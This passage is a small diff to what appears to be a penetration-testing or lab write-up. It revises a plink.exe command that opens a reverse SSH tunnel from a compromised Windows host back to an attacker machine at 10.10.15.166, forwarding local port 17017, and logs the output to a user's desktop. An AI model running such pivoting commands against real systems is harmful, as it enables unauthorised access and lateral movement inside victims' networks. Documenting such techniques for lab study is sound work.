@@ -807,7 +807,7 @@ SHELL>
 
 ``` bash
 
-SHELL> ./plink.exe -ssh -R 17017:127.0.0.1:17017 kali@10.10.15.166 -pw <password> -batch -no-antispoof
-SHELL>
+SHELL> echo y | ./plink.exe -v -ssh -P 2222 -R 17017:127.0.0.1:17017 joel@10.10.15.166 -pw <password> > C:\Users\anderson.w\Desktop\plink_out.txt 2>&1; Get-Content C:\Users\anderson.w\Desktop\plink_out.txt
+
 
 ```
